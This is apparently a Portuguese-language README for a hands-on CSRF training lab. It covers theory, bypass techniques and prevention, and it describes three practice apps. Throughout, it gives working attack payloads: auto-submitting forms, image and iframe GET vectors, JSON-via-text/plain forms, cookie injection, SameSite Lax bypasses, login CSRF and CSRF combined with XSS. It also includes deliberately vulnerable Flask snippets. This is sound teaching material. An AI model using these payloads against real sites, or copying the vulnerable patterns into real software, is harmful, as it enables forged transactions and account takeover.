# 🎭 Cross-Site Request Forgery (CSRF) - Laboratório Guiado Completo

## 📋 Visão Geral

**Dificuldade**: 🟢 Iniciante → 🔴 Avançado
**Tempo estimado**: 3-5 horas
**Pontos**: 60 (10 + 20 + 30)

### O Que Você Vai Aprender

✅ Fundamentos de CSRF
✅ Token bypass techniques
✅ JSON CSRF exploitation
✅ Login CSRF attacks
✅ CSRF com XSS
✅ SameSite cookie bypass
✅ Referer/Origin header validation bypass

---

## 📖 Teoria Completa

### O Que É CSRF?

Cross-Site Request Forgery (CSRF) é um ataque que força um usuário autenticado a executar ações indesejadas em uma aplicação web sem seu conhecimento.

### Como Funciona?

**Cenário:**
1. Vítima está logada em `bank.com`
2. Atacante envia link malicioso
3. Vítima clica no link
4. Link executa ação em `bank.com` usando sessão da vítima

**Exemplo:**
```html
<!-- Página maliciosa do atacante -->
<html>
<body>
  <h1>Você ganhou um prêmio!</h1>
  <img src="http://bank.com/transfer?to=attacker&amount=1000">
</body>
</html>
```

Quando vítima visita esta página:
- Navegador envia requisição GET para `bank.com/transfer`
- Cookies de sessão são incluídos automaticamente!
- Transferência é executada sem conhecimento da vítima

---

## 🎯 Tipos de CSRF

### 1. GET-based CSRF

**Características:**
- Mais simples de explorar
- Usa tags HTML que fazem GET automaticamente

**Vetores de ataque:**
```html
<!-- Image tag -->
<img src="http://victim.com/delete_account?confirm=yes">

<!-- Link -->
<a href="http://victim.com/change_email?email=attacker@evil.com">Click here</a>

<!-- Iframe -->
<iframe src="http://victim.com/transfer?to=attacker&amount=1000"></iframe>

<!-- Script -->
<script src="http://victim.com/api/delete_user?id=123"></script>
```

### 2. POST-based CSRF

**Características:**
- Requer JavaScript ou formulário auto-submit
- Mais comum em aplicações modernas

**Exploit básico:**
```html
<html>
<body onload="document.forms[0].submit()">
  <form action="http://victim.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="10000">
  </form>
</body>
</html>
```

**Com JavaScript:**
```html
<script>
fetch('http://victim.com/api/transfer', {
  method: 'POST',
  credentials: 'include',  // Inclui cookies
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: 'to=attacker&amount=10000'
});
</script>
```

### 3. JSON CSRF

**Características:**
- APIs REST que aceitam JSON
- Mais difícil mas possível com Content-Type bypass

**Código vulnerável:**
```python
# VULNERÁVEL ❌
@app.route('/api/transfer', methods=['POST'])
def transfer():
    data = request.get_json()
    # Sem validação CSRF!
    transfer_money(data['to'], data['amount'])
```

**Exploits:**

```html
<!-- Método 1: Form with enctype -->
<form action="http://victim.com/api/transfer" method="POST"
      enctype="text/plain">
  <input name='{"to":"attacker","amount":10000,"ignore":"' value='"}'>
</form>

<!-- Gera: {"to":"attacker","amount":10000,"ignore":"="}-->
```

```html
<!-- Método 2: XMLHttpRequest (requer CORS permissivo) -->
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://victim.com/api/transfer');
xhr.withCredentials = true;
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.send('{"to":"attacker","amount":10000}');
</script>
```

---

## 🔓 Bypass de Proteções CSRF

### 1. Token CSRF Ausente/Ignorado

```python
# VULNERÁVEL ❌
@app.route('/transfer', methods=['POST'])
def transfer():
    token = request.form.get('csrf_token')
    # Verifica se presente, mas não valida!
    if token:
        # Valida
        pass
    # Executa mesmo sem token!
    transfer_money(...)
```

**Exploit:** Simplesmente não envie o token.

### 2. Token CSRF Não Vinculado à Sessão

```python
# VULNERÁVEL ❌
VALID_TOKENS = ['token123', 'token456']  # Tokens fixos!

@app.route('/transfer', methods=['POST'])
def transfer():
    token = request.form.get('csrf_token')
    if token in VALID_TOKENS:  # ❌ Aceita qualquer token válido!
        transfer_money(...)
```

**Exploit:** Use qualquer token válido, mesmo de outra sessão.

### 3. Token CSRF em Cookie

```python
# VULNERÁVEL ❌
@app.route('/transfer', methods=['POST'])
def transfer():
    token_from_form = request.form.get('csrf_token')
    token_from_cookie = request.cookies.get('csrf_token')

    if token_from_form == token_from_cookie:  # ❌ Ambos controlados pelo atacante!
        transfer_money(...)
```

**Exploit:**
```html
<script>
// Seta cookie com valor conhecido
document.cookie = "csrf_token=attacker_token; domain=victim.com";
</script>

<form action="http://victim.com/transfer" method="POST">
  <input name="csrf_token" value="attacker_token">
  ...
</form>
```

### 4. Validação de Referer/Origin Fraca

```python
# VULNERÁVEL ❌
@app.route('/transfer', methods=['POST'])
def transfer():
    referer = request.headers.get('Referer', '')

    # Verifica se contém o domínio
    if 'victim.com' in referer:  # ❌ Bypass possível!
        transfer_money(...)
```

**Bypass:**
```
Host malicioso: victim.com.attacker.com
Ou: attacker.com/victim.com
```

### 5. SameSite Cookie Bypass

```python
# VULNERÁVEL ❌
response.set_cookie('session', value, samesite='Lax')
```

**Comportamento SameSite=Lax:**
- GET requests: cookies enviados
- POST cross-site: cookies NÃO enviados
- Mas navegação top-level: cookies enviados!

**Exploit para Lax:**
```html
<!-- Método 1: GET CSRF ainda funciona -->
<img src="http://victim.com/action?param=value">

<!-- Método 2: Top-level navigation -->
<script>
window.open('http://victim.com/transfer?to=attacker&amount=1000');
</script>
```

---

## 🚀 Técnicas Avançadas

### 1. Login CSRF

Força vítima a logar com conta do atacante.

**Objetivo:** Vítima usa conta do atacante, atacante vê todas as ações da vítima.

```html
<form action="http://victim.com/login" method="POST" id="login">
  <input name="username" value="attacker_account">
  <input name="password" value="attacker_password">
</form>

<script>
document.getElementById('login').submit();
</script>
```

### 2. CSRF + XSS

Combina CSRF com XSS para bypass de defesas.

```javascript
// XSS executa no contexto de victim.com
// Pode ler token CSRF do DOM e usá-lo!

var token = document.querySelector('[name=csrf_token]').value;

fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': token  // Token legítimo!
  },
  body: JSON.stringify({to: 'attacker', amount: 10000})
});
```

### 3. CSRF via WebSocket

```javascript
// WebSockets não seguem SOP (Same-Origin Policy)
var ws = new WebSocket('ws://victim.com/chat');

ws.onopen = function() {
  ws.send(JSON.stringify({
    action: 'delete_account',
    user_id: 123
  }));
};
```

### 4. Type Juggling CSRF

```python
# VULNERÁVEL ❌
@app.route('/api/action', methods=['POST'])
def action():
    data = request.get_json() or request.form.to_dict()
    # Aceita tanto JSON quanto form data!

    csrf_token = data.get('csrf_token')
    if csrf_token == session['csrf_token']:
        do_action(data)
```

**Exploit:** Se JSON requer token mas form não, envie como form!

---

## 📚 Payloads e Exploits

### GET CSRF

```html
<!-- 1. Image tag (invisível) -->
<img src="http://target.com/delete?id=123" style="display:none">

<!-- 2. CSS background -->
<div style="background:url('http://target.com/logout')"></div>

<!-- 3. Link com auto-click -->
<a href="http://target.com/action" id="csrf">Click</a>
<script>document.getElementById('csrf').click();</script>

<!-- 4. Meta refresh -->
<meta http-equiv="refresh" content="0;url=http://target.com/action">
```

### POST CSRF

```html
<!-- Auto-submit form -->
<html>
<body onload="document.forms[0].submit()">
  <form action="http://target.com/api/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="9999">
    <input type="hidden" name="csrf_token" value="">
  </form>
</body>
</html>
```

### JSON CSRF com text/plain

```html
<form action="http://target.com/api/action" method="POST"
      enctype="text/plain">
  <input name='{"action":"delete","id":"123","ignore":"' value='"}'>
  <input type="submit" value="Click here to win!">
</form>

<!-- Payload enviado:
{"action":"delete","id":"123","ignore":"="}
-->
```

### CSRF com Fetch API

```html
<script>
fetch('http://target.com/api/change_email', {
  method: 'POST',
  mode: 'no-cors',  // Bypass CORS check
  credentials: 'include',  // Inclui cookies
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: 'email=attacker@evil.com'
});
</script>
```

---

## 🛡️ Prevenção

### 1. CSRF Token Correto

```python
# CORRETO ✅
import secrets

@app.route('/form', methods=['GET'])
def show_form():
    # Gera token único para a sessão
    if 'csrf_token' not in session:
        session['csrf_token'] = secrets.token_urlsafe(32)

    return render_template('form.html', csrf_token=session['csrf_token'])

@app.route('/action', methods=['POST'])
def action():
    token_from_form = request.form.get('csrf_token')
    token_from_session = session.get('csrf_token')

    # Valida token
    if not token_from_form or token_from_form != token_from_session:
        return 'CSRF token validation failed', 403

    # Executa ação
    do_sensitive_action()
    return 'Success'
```

### 2. SameSite Cookie Strict

```python
# CORRETO ✅
response.set_cookie(
    'session',
    value,
    samesite='Strict',  # Nunca envia em requisições cross-site
    secure=True,        # Apenas HTTPS
    httponly=True       # Não acessível via JavaScript
)
```

### 3. Validação de Origin/Referer

```python
# CORRETO ✅
@app.before_request
def check_origin():
    if request.method in ['POST', 'PUT', 'DELETE']:
        origin = request.headers.get('Origin')
        referer = request.headers.get('Referer')

        allowed_origins = ['https://myapp.com', 'https://www.myapp.com']

        if origin:
            if origin not in allowed_origins:
                return 'Invalid origin', 403
        elif referer:
            if not any(referer.startswith(o) for o in allowed_origins):
                return 'Invalid referer', 403
        else:
            return 'Missing origin/referer', 403
```

### 4. Custom Header (Double Submit)

```python
# CORRETO ✅
@app.route('/api/action', methods=['POST'])
def action():
    # Requer header customizado (AJAX não consegue fazer cross-domain sem CORS)
    csrf_header = request.headers.get('X-CSRF-Token')
    csrf_cookie = request.cookies.get('csrf_token')

    if not csrf_header or csrf_header != csrf_cookie:
        return 'CSRF validation failed', 403

    do_action()
```

```javascript
// Cliente
fetch('/api/action', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': getCookie('csrf_token')  // Lê do cookie
  },
  body: JSON.stringify(data)
});
```

### 5. Re-autenticação para Ações Críticas

```python
# CORRETO ✅
@app.route('/delete_account', methods=['POST'])
@login_required
def delete_account():
    # Requer senha novamente
    password = request.form.get('password')

    if not verify_password(current_user, password):
        return 'Invalid password', 403

    delete_user_account(current_user)
    return 'Account deleted'
```

---

## 🎯 Estrutura do Laboratório

### 1. 🟢 Basic App (10 pontos)
- **Porta**: 5070
- **Cenário**: Gerenciador de tarefas
- GET CSRF em delete task
- POST CSRF em change password
- Sem proteção CSRF

### 2. 🟡 Intermediate App (20 pontos)
- **Porta**: 5071
- **Cenário**: Banking app
- Token CSRF fraco (não vinculado)
- JSON CSRF em API
- Referer validation bypass
- Login CSRF

### 3. 🔴 Advanced App (30 pontos)
- **Porta**: 5072
- **Cenário**: Social network
- SameSite Lax bypass
- CSRF + XSS exploitation
- WebSocket CSRF
- Type juggling bypass

---

## 📝 Checklist de Conclusão

- [ ] Entendi o conceito de CSRF
- [ ] Explorei GET-based CSRF
- [ ] Explorei POST-based CSRF
- [ ] Executei JSON CSRF com text/plain
- [ ] Bypassei token CSRF fraco
- [ ] Explorei Login CSRF
- [ ] Bypassei validação de Referer
- [ ] Bypassei SameSite Lax
- [ ] Combinei CSRF com XSS
- [ ] Completei todos os exercícios

**Total**: 60 pontos

---

## 🎓 Próximos Passos

Após dominar CSRF:

1. **Clickjacking**
2. **CORS Misconfiguration**
3. **WebSocket Security**
4. **OAuth CSRF**

**Próximo Lab**: [08 - Insecure Deserialization →](../08-deserialization/README.md)

---

**Boa sorte e happy hacking! 🎭**
